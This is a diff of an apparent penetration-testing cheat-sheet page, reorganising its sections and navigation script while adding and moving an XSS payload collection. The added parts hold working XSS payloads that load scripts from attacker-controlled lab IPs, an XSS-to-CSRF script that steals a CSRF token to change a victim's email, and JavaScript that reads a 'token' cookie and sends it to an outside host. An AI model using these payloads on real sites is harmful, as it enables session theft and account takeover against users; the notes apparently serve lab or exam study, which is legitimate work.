@@ -18,7 +18,7 @@ permalink: /python-code-snippets/
     --bg: #0a0a0a;
     --panel: #151515;
     --muted: #a1a1a1;
-    --text: #ffc0cb;
+    --text: #f08080;
     --accent: #c71585;
     --accent-2: #ffffff;
     --code-bg: #050505;
@@ -135,25 +135,26 @@ permalink: /python-code-snippets/
       <strong>Contents</strong>
       <ol>
         <li><a href="#Concepts">Concepts</a></li>
-        <li><a href="#Enable-Database-Debug-and-Logging">Enable Database Debug and Logging</a>
+        <li><a href="#Enable-Database-Debug-and-Logging" class="main-group" data-subs="Postgres,MySQL">Enable Database Debug and Logging</a>
           <ul>
             <li><a href="#Postgres">Postgres</a></li>
             <li><a href="#MySQL">MySQL</a></li>
           </ul>
         </li>
-        <li><a href="#Python-Code-Snippets">Python Code Snippets</a>
+        <li><a href="#Python-Code-Snippets" class="main-group" data-subs="Starting-Template,File-Upload,HTTP-File-Server,Python-XSS-Cookies-Stealer">Python Code Snippets</a>
           <ul>
             <li><a href="#Starting-Template">Starting Template</a></li>
             <li><a href="#File-Upload">File Upload</a></li>
             <li><a href="#HTTP-File-Server">HTTP File Server</a></li>
+            <li><a href="#Python-XSS-Cookies-Stealer">XSS Cookies Stealer</a></li>
           </ul>
         </li>
-        <li><a href="#XSS-Payloads">XSS Payloads</a>
+        <li><a href="#XSS-Payloads" class="main-group" data-subs="Payload-1,Payload-2,Leverage-XSS-to-CSRF,XSS-Cookies-Stealer-js">XSS Payloads</a>
           <ul>
             <li><a href="#Payload-1">Payload 1</a></li>
             <li><a href="#Payload-2">Payload 2</a></li>
-            <li><a href="#XSS-Cookies-Stealer">XSS Cookies Stealer</a></li>
             <li><a href="#Leverage-XSS-to-CSRF">Leverage XSS to CSRF</a></li>
+            <li><a href="#XSS-Cookies-Stealer-js">Filter cookie & send</a></li>
           </ul>
         </li>
         <li><a href="#Java-Code-Snippets">Java Code Snippets</a></li>
@@ -189,9 +190,11 @@ permalink: /python-code-snippets/
         </div>
       </div>
 
-      <div class="content-section" id="section-Enable-Database-Debug-and-Logging">
-        <h2 id="Enable-Database-Debug-and-Logging">Enable Database Debug and Logging</h2>
-
+      <span id="Enable-Database-Debug-and-Logging"></span>
+      <div class="content-section group-enable-db" id="section-Enable-Database-Debug-and-Logging-title">
+        <h2>Enable Database Debug and Logging</h2>
+      </div>
+      <div class="content-section group-enable-db" id="section-Postgres">
         <h3 id="Postgres">Postgres</h3>
         <p>Edit your <code class="inline">/etc/postgresql/&lt;version-num&gt;/main/postgresql.conf</code>, and change the lines as follows.</p>
         <p class="muted">Note: If you didn't find the postgresql.conf file, then just type <code class="kbd">$locate postgresql.conf</code> in a terminal</p>
@@ -214,7 +217,8 @@ permalink: /python-code-snippets/
             <li>Find current log in <code class="inline">/var/lib/postgresql/10/main/log</code></li>
           </ol>
         </div>
-
+      </div>
+      <div class="content-section group-enable-db" id="section-MySQL">
         <h3 id="MySQL">MySQL</h3>
         <p>Login to the MySQL instance and check out the <code class="inline">general_log</code> and values, whether it is set to ON or OFF:</p>
         <div class="panel">
@@ -229,9 +233,11 @@ permalink: /python-code-snippets/
         <p>Then check <code class="inline">general_log_file</code> to find where logs are written.</p>
       </div>
 
-      <div class="content-section" id="section-Python-Code-Snippets">
-        <h2 id="Python-Code-Snippets">Python Code Snippets</h2>
-
+      <span id="Python-Code-Snippets"></span>
+      <div class="content-section group-python" id="section-Python-Code-Snippets-title">
+        <h2>Python Code Snippets</h2>
+      </div>
+      <div class="content-section group-python" id="section-Starting-Template">
         <h3 id="Starting-Template">Starting Template</h3>
         <div class="panel">
           <pre><code class="language-python">import requests
@@ -291,9 +297,9 @@ if __name__ == "__main__":
     username, password = register()
     usercookies = login(username, password) </code></pre>
         </div>
-
         <hr />
-
+      </div>
+      <div class="content-section group-python" id="section-File-Upload">
         <h3 id="File-Upload">File Upload With Additional Parameters</h3>
         <div class="panel">
           <pre><code class="language-python">def uploadFile(phpsessid):
@@ -331,9 +337,9 @@ if __name__ == "__main__":
         print("[-] File is not uploaded.")
     return filename</code></pre>
         </div>
-
         <hr />
-
+      </div>
+      <div class="content-section group-python" id="section-HTTP-File-Server">
         <h3 id="HTTP-File-Server">HTTP File Server 1</h3>
         <div class="panel">
           <pre><code class="language-python">from http.server import BaseHTTPRequestHandler
@@ -477,8 +483,9 @@ server_thread.start()
 # Main program continues here (non-blocking)
 print(f"{success} File server started in background. Main program running...")</code></pre>
         </div>
-
-        <h3 id="XSS-Cookies-Stealer">XSS Cookies Stealer</h3>
+      </div>
+      <div class="content-section group-python" id="section-Python-XSS-Cookies-Stealer">
+        <h3 id="Python-XSS-Cookies-Stealer">XSS Cookies Stealer</h3>
         <div class="panel">
           <pre><code class="language-python">def send_xss_payload():
 
@@ -531,8 +538,74 @@ def listen_for_cookies():
 send_xss_payload()
 listen_for_cookies()</code></pre>
         </div>
-
         <hr />
+      </div>
+
+      <span id="XSS-Payloads"></span>
+      <div class="content-section group-xss" id="section-XSS-Payloads-title">
+        <h2>XSS Payloads</h2>
+      </div>
+      <div class="content-section group-xss" id="section-Payload-1">
+        <h3 id="Payload-1">Load External JavaScript</h3>
+        <div class="panel">
+          <ul>
+            <li><code>&lt;img src="invalid-image" onerror="var script = document.createElement('script'); script.src='http://192.168.118.2/malicious.js'; document.body.appendChild(script);" /&gt;</code></li>
+            <li><code>&lt;img src=x onerror=eval(atob("&lt;BASE64 JAVASCRIPT PAYLOAD&gt;"))&gt;</code></li>
+            <li><code>&lt;audio onloadstart="var s=document.createElement('script');s.src='//192.168.45.163/worked.js';document.head.appendChild(s)"&gt;&lt;source&gt;&lt;/audio&gt;</code></li>
+            <li><code>&lt;iframe/srcdoc="&lt;script/src=//192.168.45.163/worked.js&gt;&lt;/script&gt;"&gt;</code></li>
+            <li><code>&lt;strong onafterscriptexecute=""&gt;&lt;script src="http://192.168.45.163/worked.js"&gt;&lt;/script&gt;&lt;/strong&gt;</code></li>
+          </ul>
+        </div>
+      </div>
+      <div class="content-section group-xss" id="section-Payload-2">
+        <h3 id="Payload-2">Load Inline JavaScript</h3>
+        <div class="panel">
+          <ul>
+            <li><code>&lt;audio onloadstart="setTimeout(atob('YWxlcnQoIlhTUyIp'))"&gt;&lt;source&gt;&lt;/audio&gt;</code></li>
+            <li><code>&lt;audio src=x onerror=Function(atob('YWxlcnQoIlhTUyIp'))()&gt;&lt;/audio&gt;</code></li>
+            <li><code>&lt;audio onloadstart="Function(atob('YWxlcnQoIlhTUyIp'))()"&gt;&lt;source&gt;&lt;/audio&gt;</code></li>
+            <li><code>&lt;video src=x onerror=eval(atob('YWxlcnQoIlhTUyIp'))&gt;&lt;/video&gt;</code></li>
+          </ul>
+        </div>
+      </div>
+      <div class="content-section group-xss" id="section-Leverage-XSS-to-CSRF">
+        <h3 id="Leverage-XSS-to-CSRF">Leverage XSS to CSRF</h3>
+        <div class="panel">
+          <pre><code class="language-javascript">var req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.open('get','/my-account',true);
+req.send();
+function handleResponse() {
+    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
+    var changeReq = new XMLHttpRequest();
+    changeReq.open('post', '/my-account/change-email', true);
+    changeReq.send('csrf='+token+'&email=test@test.com')
+};</code></pre>
+        </div>
+      </div>
+      <div class="content-section group-xss" id="section-XSS-Cookies-Stealer-js">
+        <h3 id="XSS-Cookies-Stealer-js">Filter cookie & send</h3>
+        <div class="panel">
+          <pre><code class="language-javascript">function getCookieValue(name) {
+    const cookieString = document.cookie;
+    const cookies = cookieString.split('; ');
+    for (let cookie of cookies) {
+        const [key, value] = cookie.split('=');
+        if (key === name) return value;
+    }
+    return null;
+}
+const cookieName = 'token';
+const cookieValue = getCookieValue(cookieName);
+
+var req2 = new XMLHttpRequest();
+req2.open('GET', 'http://192.168.45.163/' + (cookieValue || ''), false);
+req2.send();</code></pre>
+        </div>
+      </div>
+
+      <div class="content-section" id="section-Java-Code-Snippets">
+        <h2 id="Java-Code-Snippets">Java Code Snippets</h2>
       </div>
 
       <div class="content-section" id="section-Java-Insecure-Deserialization">
@@ -596,68 +669,6 @@ set_cookie = r.headers.get('Set-Cookie', '')
 match = re.search(r'JSESSIONID=([A-Za-z0-9]+);', set_cookie)
 print(match.group(1))</code></pre>
         </div>
-      </div>
-
-      <div class="content-section" id="section-XSS-Payloads">
-        <h2 id="XSS-Payloads">XSS Payloads</h2>
-
-        <h3 id="Payload-1">Load External JavaScript</h3>
-        <div class="panel">
-          <ul>
-            <li><code>&lt;img src="invalid-image" onerror="var script = document.createElement('script'); script.src='http://192.168.118.2/malicious.js'; document.body.appendChild(script);" /&gt;</code></li>
-            <li><code>&lt;img src=x onerror=eval(atob("&lt;BASE64 JAVASCRIPT PAYLOAD&gt;"))&gt;</code></li>
-            <li><code>&lt;audio onloadstart="var s=document.createElement('script');s.src='//192.168.45.163/worked.js';document.head.appendChild(s)"&gt;&lt;source&gt;&lt;/audio&gt;</code></li>
-            <li><code>&lt;iframe/srcdoc="&lt;script/src=//192.168.45.163/worked.js&gt;&lt;/script&gt;"&gt;</code></li>
-            <li><code>&lt;strong onafterscriptexecute=""&gt;&lt;script src="http://192.168.45.163/worked.js"&gt;&lt;/script&gt;&lt;/strong&gt;</code></li>
-          </ul>
-        </div>
-
-        <h3 id="Payload-2">Load Inline JavaScript</h3>
-        <div class="panel">
-          <ul>
-            <li><code>&lt;audio onloadstart="setTimeout(atob('YWxlcnQoIlhTUyIp'))"&gt;&lt;source&gt;&lt;/audio&gt;</code></li>
-            <li><code>&lt;audio src=x onerror=Function(atob('YWxlcnQoIlhTUyIp'))()&gt;&lt;/audio&gt;</code></li>
-            <li><code>&lt;audio onloadstart="Function(atob('YWxlcnQoIlhTUyIp'))()"&gt;&lt;source&gt;&lt;/audio&gt;</code></li>
-            <li><code>&lt;video src=x onerror=eval(atob('YWxlcnQoIlhTUyIp'))&gt;&lt;/video&gt;</code></li>
-          </ul>
-        </div>
-
-        <h3 id="Leverage-XSS-to-CSRF">Leverage XSS to CSRF</h3>
-        <div class="panel">
-          <pre><code class="language-javascript">var req = new XMLHttpRequest();
-req.onload = handleResponse;
-req.open('get','/my-account',true);
-req.send();
-function handleResponse() {
-    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
-    var changeReq = new XMLHttpRequest();
-    changeReq.open('post', '/my-account/change-email', true);
-    changeReq.send('csrf='+token+'&email=test@test.com')
-};</code></pre>
-        </div>
-
-        <h3 id="XSS-Cookies-Stealer-js">Filter cookie & send</h3>
-        <div class="panel">
-          <pre><code class="language-javascript">function getCookieValue(name) {
-    const cookieString = document.cookie;
-    const cookies = cookieString.split('; ');
-    for (let cookie of cookies) {
-        const [key, value] = cookie.split('=');
-        if (key === name) return value;
-    }
-    return null;
-}
-const cookieName = 'token';
-const cookieValue = getCookieValue(cookieName);
-
-var req2 = new XMLHttpRequest();
-req2.open('GET', 'http://192.168.45.163/' + (cookieValue || ''), false);
-req2.send();</code></pre>
-        </div>
-      </div>
-
-      <div class="content-section" id="section-Java-Code-Snippets">
-        <h2 id="Java-Code-Snippets">Java Code Snippets</h2>
       </div>
 
       <div class="content-section" id="section-Bypass-PHP-Eval-Filtering">
@@ -729,13 +740,25 @@ document.addEventListener('DOMContentLoaded', function() {
       const targetId = this.getAttribute('href');
       const targetElement = document.querySelector(targetId);
       if (targetElement) {
-        const section = targetElement.closest('.content-section');
-        if (section) {
+        if (this.classList.contains('main-group')) {
+          const subs = this.dataset.subs.split(',');
           document.querySelectorAll('.content-section').forEach(sec => sec.style.display = 'none');
-          section.style.display = 'block';
-          setTimeout(() => {
-            targetElement.scrollIntoView({ behavior: 'smooth' });
-          }, 100);
+          subs.forEach(sub => {
+            const sec = document.querySelector(`#section-${sub}`);
+            if (sec) sec.style.display = 'block';
+          });
+          const titleSec = document.querySelector(`#section-${targetId.slice(1)}-title`);
+          if (titleSec) titleSec.style.display = 'block';
+          if (targetElement) targetElement.scrollIntoView({ behavior: 'smooth' });
+        } else {
+          const section = targetElement.closest('.content-section');
+          if (section) {
+            document.querySelectorAll('.content-section').forEach(sec => sec.style.display = 'none');
+            section.style.display = 'block';
+            setTimeout(() => {
+              targetElement.scrollIntoView({ behavior: 'smooth' });
+            }, 100);
+          }
         }
       }
     });
